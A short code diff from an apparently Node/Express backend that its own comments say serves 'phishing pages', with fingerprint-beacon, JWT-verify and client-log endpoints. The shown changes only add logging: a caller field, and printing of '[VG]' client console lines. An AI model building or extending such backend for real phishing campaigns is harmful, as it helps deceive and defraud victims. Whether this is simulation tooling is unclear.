@@ -477,7 +477,7 @@ app.post('/api/beacon/fp', async (req, res) => {
 // Verify endpoint for JWT validation (phishing pages)
 app.post('/api/verify', async (req, res) => {
   const reqLinkId = req.query.link_id ? String(req.query.link_id) : '';
-  console.log('[DevCode] /api/verify hit origin=' + (req.get('origin') || req.headers.host || '-') + ' token_len=' + String(req.body && req.body.token || '').length + ' query_link_id=' + reqLinkId);
+  console.log('[DevCode] /api/verify hit origin=' + (req.get('origin') || req.headers.host || '-') + ' token_len=' + String(req.body && req.body.token || '').length + ' query_link_id=' + reqLinkId + ' caller=' + (req.body && req.body.caller || '-'));
   try {
     const jwt = require('jsonwebtoken');
     const { token } = req.body || {};
@@ -629,7 +629,11 @@ app.post('/api/log', async (req, res) => {
         if (log.data) {
           try { msg += ' ' + (typeof log.data === 'string' ? log.data : JSON.stringify(log.data)); } catch(e) {}
         }
-        if (log.level === 'error' || /\[DevCode\]/.test(msg)) {
+        // vg-engine overrides console.* inside the page, so every client-side
+        // console.log arrives here queued rather than in the browser console.
+        // [VG] lines were previously stored in deployment_logs but never
+        // printed, which hid the entire client half of the flow.
+        if (log.level === 'error' || /\[DevCode\]|\[VG\]/.test(msg)) {
           console.error('[Worker Log] link_id=' + decoded.link_id + ' msg=' + msg);
         }
         await db.query(
